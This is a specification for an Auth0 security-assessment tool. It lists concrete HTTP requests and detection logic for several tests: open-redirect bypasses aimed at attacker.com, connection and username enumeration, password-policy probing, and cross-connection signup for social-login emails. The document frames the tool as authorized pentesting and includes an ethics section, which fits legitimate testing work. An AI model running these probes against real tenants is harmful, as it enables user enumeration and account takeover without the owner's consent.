# Auth0 Explorer - Tool Specification

**Version:** 1.0  
**Purpose:** Security assessment and reconnaissance tool for Auth0 implementations

---

## Quick Reference: Security Checks

| # | Check | Phase | Severity | Description |
|---|-------|-------|----------|-------------|
| 1 | OpenID Configuration | 1.1 | INFO | Discovers supported grant types and algorithms |
| 2 | Open Redirect | 1.2 | HIGH | Tests redirect URI validation |
| 3 | Connection Enumeration | 2.1 | MEDIUM | Discovers available authentication methods |
| 4 | Username Enumeration - Signup | 3.1 | MEDIUM | Identifies valid user accounts via signup endpoint |
| 5 | Password Policy Discovery | 3.2 | INFO | Determines password complexity requirements |
| 6 | Public Signup Misconfiguration | 3.3 | HIGH | Tests if unintended public registration is possible |

---

## Tool Parameters

### Required
```json
{
  "domain": "victim.auth0.com",
  "client_id": "abc123xyz"
}
```

### Optional
```json
{
  "target_app_url": "https://app.victim.com",
  "connection_wordlist": "connections.txt",
  "user_wordlist": "emails.txt",
  "output_dir": "./results",
  "rate_limit_delay": 1.0,
  "parallel_workers": 5,
  "proxy": "http://proxy:8080",
  "user_agent": "Mozilla/5.0...",
  "cleanup_test_accounts": true,
  "respect_rate_limits": true
}
```

---

## PHASE 1: RECONNAISSANCE

### Check 1.1: OpenID Configuration Discovery

**Purpose:** Discover Auth0 tenant configuration

**Request:**
```http
GET https://victim.auth0.com/.well-known/openid-configuration
```

**Example Response:**
```json
{
  "issuer": "https://victim.auth0.com/",
  "authorization_endpoint": "https://victim.auth0.com/authorize",
  "token_endpoint": "https://victim.auth0.com/oauth/token",
  "jwks_uri": "https://victim.auth0.com/.well-known/jwks.json",
  "grant_types_supported": ["authorization_code", "password", "refresh_token"],
  "id_token_signing_alg_values_supported": ["RS256"]
}
```

**What to Check:**
- ✓ `"password"` in grant_types_supported → Resource Owner Password Grant enabled (allows direct credential submission)
- ✓ `"none"` in id_token_signing_alg_values_supported → Weak/insecure algorithm
- ✓ Record all endpoints for later testing

**Output:**
```json
{
  "password_grant_enabled": true,
  "weak_algorithms": [],
  "endpoints": {...}
}
```

---

### Check 1.2: Open Redirect

**Purpose:** Test redirect URI validation

**Test URIs:**
```python
test_redirects = [
    "https://attacker.com",
    "http://localhost:9999",
    "https://app.victim.com@attacker.com",
    "https://app.victim.com/../../../attacker.com",
    "https://app.victim.com%2f%2fattacker.com"
]
```

**Request (per URI):**
```http
GET https://victim.auth0.com/authorize?
  client_id=abc123&
  response_type=code&
  redirect_uri=https://attacker.com&
  state=test&
  scope=openid
```

**If redirects to attacker.com:**
```json
{
  "vulnerability": "OPEN_REDIRECT",
  "working_bypass": "https://attacker.com",
  "risk": "HIGH: Can steal authorization codes"
}
```

**Output:**
```json
{
  "redirect_validation_strict": false,
  "vulnerable_bypasses": ["https://attacker.com"]
}
```

---

## PHASE 2: CONNECTION DISCOVERY

### Check 2.1: Connection Enumeration

**Purpose:** Discover all available authentication methods

**Default Wordlist:**
```
Username-Password-Authentication
email
sms
google-oauth2
facebook
github
twitter
linkedin
windowslive
apple
Database-Connection
Legacy-Database
Corporate-AD
LDAP
```

**Request (per connection name):**
```http
POST https://victim.auth0.com/oauth/token
Content-Type: application/json

{
  "client_id": "abc123xyz",
  "connection": "Legacy-Database",
  "grant_type": "password",
  "username": "test@test.com",
  "password": "dummy"
}
```

**Example Responses:**

**Connection Exists:**
```json
{
  "error": "invalid_grant",
  "error_description": "Wrong email or password."
}
```

**Connection Doesn't Exist:**
```json
{
  "error": "invalid_request",
  "error_description": "The connection was not found"
}
```

**Detection Logic:**
```python
if "Wrong" in error or "invalid_grant" in error:
    return "FOUND"
elif "connection" in error and "not found" in error:
    return "NOT_FOUND"
else:
    return "UNCLEAR"
```

**Output:**
```json
{
  "found_connections": [
    "Username-Password-Authentication",
    "google-oauth2",
    "Legacy-Database"
  ],
  "total_found": 3
}
```

---

## PHASE 3: PER-CONNECTION TESTING

**Note:** Run checks 3.1 through 3.3 for **EACH** discovered connection

---

### Check 3.1: Username Enumeration - Signup Method

**Purpose:** Identify valid user accounts via signup endpoint

**Request:**
```http
POST https://victim.auth0.com/dbconnections/signup
Content-Type: application/json

{
  "client_id": "abc123xyz",
  "email": "admin@victim.com",
  "password": "Test123!",
  "connection": "Username-Password-Authentication"
}
```

**Example Responses:**

**User Already Exists:**
```json
{
  "statusCode": 400,
  "error": "Bad Request",
  "message": "The user already exists."
}
```

**User Created (New Account):**
```json
{
  "_id": "auth0|507f1f77bcf86cd799439011",
  "email_verified": false,
  "email": "admin@victim.com"
}
```

**Signup Disabled:**
```json
{
  "statusCode": 403,
  "error": "Forbidden",
  "message": "Public signup is disabled"
}
```

**Detection Logic:**
```python
if "already exists" in response:
    return "USER_EXISTS"
elif "_id" in response:
    return "USER_CREATED"  # Warning: cleanup needed!
elif "signup is disabled" in response:
    return "SIGNUP_DISABLED"
else:
    return "USER_NOT_FOUND"
```

**Output:**
```json
{
  "Username-Password-Authentication": {
    "valid_users": ["admin@victim.com", "support@victim.com"],
    "signup_disabled": false
  }
}
```

---

### Check 3.2: Password Policy Discovery

**Purpose:** Determine password complexity requirements

**Test Passwords:**
```python
test_passwords = [
    "a",              # Too short
    "password",       # No numbers
    "password1",      # No uppercase
    "Password1",      # No special chars
    "Pass1!",         # Might be too short
    "Password1!",     # Fair policy minimum
    "Pass123456789!"  # Length test
]
```

**Request (per password):**
```http
POST https://victim.auth0.com/dbconnections/signup
Content-Type: application/json

{
  "client_id": "abc123xyz",
  "email": "test_1699564800@test.com",
  "password": "Password1!",
  "connection": "Username-Password-Authentication"
}
```

**Example Responses:**

**Too Weak:**
```json
{
  "statusCode": 400,
  "message": "PasswordStrengthError: Password is too weak"
}
```

**Accepted:**
```json
{
  "_id": "auth0|123",
  "email": "test_1699564800@test.com"
}
```

**Policy Classification:**
```
Accepts "password1" → LOW (6 chars, no complexity)
Accepts "Password1" → FAIR (8 chars, no complexity) 
Accepts "Password1!" → GOOD (8 chars, some complexity)
Requires "Pass123456789!" → EXCELLENT (10+ chars, full complexity)
```

**Output:**
```json
{
  "Username-Password-Authentication": {
    "password_policy": "FAIR",
    "min_length": 8,
    "requires_uppercase": false,
    "requires_numbers": false,
    "requires_special": false,
    "risk": "MEDIUM: Weak password policy allows common passwords"
  }
}
```

---

### Check 3.3: Public Signup Misconfiguration

**Purpose:** Test if public registration is accessible when not intended

**Test 1: Direct Signup**
```http
POST https://victim.auth0.com/dbconnections/signup
Content-Type: application/json

{
  "client_id": "abc123xyz",
  "email": "test_signup_1699564800@test.com",
  "password": "TestPassword123!",
  "connection": "Username-Password-Authentication"
}
```

**Responses:**

**Public Signup Enabled (Potential Issue):**
```json
{
  "_id": "auth0|123",
  "email": "test_signup_1699564800@test.com",
  "email_verified": false
}
```

**Public Signup Disabled (Good):**
```json
{
  "statusCode": 403,
  "message": "Public signup is disabled"
}
```

**Test 2: Cross-Connection Signup**

Test if you can create a password account for a social login email:

```http
POST https://victim.auth0.com/dbconnections/signup
Content-Type: application/json

{
  "client_id": "abc123xyz",
  "email": "social_user@gmail.com",  // Email from Google account
  "password": "TestPassword123!",
  "connection": "Username-Password-Authentication",  // Different connection!
  "credential_type": "http://auth0.com/oauth/grant-type/password-realm"
}
```

**Output:**
```json
{
  "public_signup_enabled": true,
  "allows_cross_connection_signup": true,
  "risk": "CRITICAL: Can create password accounts for social-only users"
}
```

---


## Output Report Format

```json
{
  "scan_metadata": {
    "target_domain": "victim.auth0.com",
    "client_id": "abc123",
    "scan_start": "2025-11-16T10:00:00Z",
    "scan_duration_seconds": 1800
  },
  
  "phase1_reconnaissance": {
    "password_grant_enabled": true,
    "cors_misconfigured": false
  },
  
  "phase2_connections": {
    "total_found": 3,
    "connections": ["Username-Password-Authentication", "google-oauth2", "Legacy-Database"]
  },
  
  "phase3_per_connection": {
    "Username-Password-Authentication": {
      "valid_users": ["admin@victim.com"],
      "password_policy": "FAIR",
      "public_signup_enabled": false,
      "risk_score": "MEDIUM"
    },
    "Legacy-Database": {
      "valid_users": ["old_admin@victim.com"],
      "password_policy": "FAIR",
      "public_signup_enabled": true,
      "risk_score": "HIGH"
    }
  },
  
  "phase4_application_attacks": {
    "open_redirect_found": false,
    "xss_found": false
  },
  
  "risk_summary": {
    "overall_risk": "CRITICAL",
    "critical_findings": 2,
    "high_findings": 1,
    "medium_findings": 2,
    "low_findings": 0,
    "recommendations": [
      "HIGH: Disable Legacy-Database connection or fix configuration",
      "HIGH: Disable public signup on unintended connections",
      "MEDIUM: Enforce stronger password policies"
    ]
  }
}
```

---

## Example Tool Usage

### Basic Reconnaissance Only
```bash
auth0-pentest \
  --domain victim.auth0.com \
  --client-id abc123 \
  --phases 1,2,3
```

### Full Passive Assessment
```bash
auth0-pentest \
  --domain victim.auth0.com \
  --client-id abc123 \
  --user-wordlist emails.txt \
  --output results/
```

### Active Testing (Authorized)
```bash
auth0-pentest \
  --domain victim.auth0.com \
  --client-id abc123 \
  --user-wordlist emails.txt \
  --output results/
```

---

## Safety & Ethics

### Before Running
✅ Get written authorization  
✅ Understand legal boundaries  
✅ Have incident response plan  
✅ Know when to stop  

### Stop Immediately If
🛑 Account gets blocked  
🛑 IP gets banned  
🛑 Unauthorized access gained  

### Cleanup
🧹 Delete test accounts created  
🧹 Clear cached tokens  
🧹 Remove test data  

---

## References

- [Auth0 Documentation](https://auth0.com/docs)
- [Auth0 Security Best Practices](https://auth0.com/docs/secure)
- [Auth0 Attack Protection](https://auth0.com/docs/secure/attack-protection)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

**Disclaimer:** For authorized security testing only. Unauthorized access is illegal.
